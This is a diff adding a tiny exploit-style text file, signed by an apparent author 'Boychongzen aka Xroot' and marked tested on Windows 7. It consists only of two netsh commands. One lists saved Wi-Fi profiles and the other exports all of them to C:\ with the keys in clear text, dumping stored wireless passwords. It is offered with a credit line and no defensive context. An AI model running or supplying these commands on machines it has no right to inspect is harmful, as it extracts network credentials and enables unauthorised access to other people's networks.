@@ -1,0 +1,11 @@
+Author :  Boychongzen aka Xroot
+
+Tested : Windows Seven
+
+
+netsh wlan show profile
+
+netsh wlan export profile folder=C:\ key=clear
+
+
+Regards Boychongzen aka Xroot
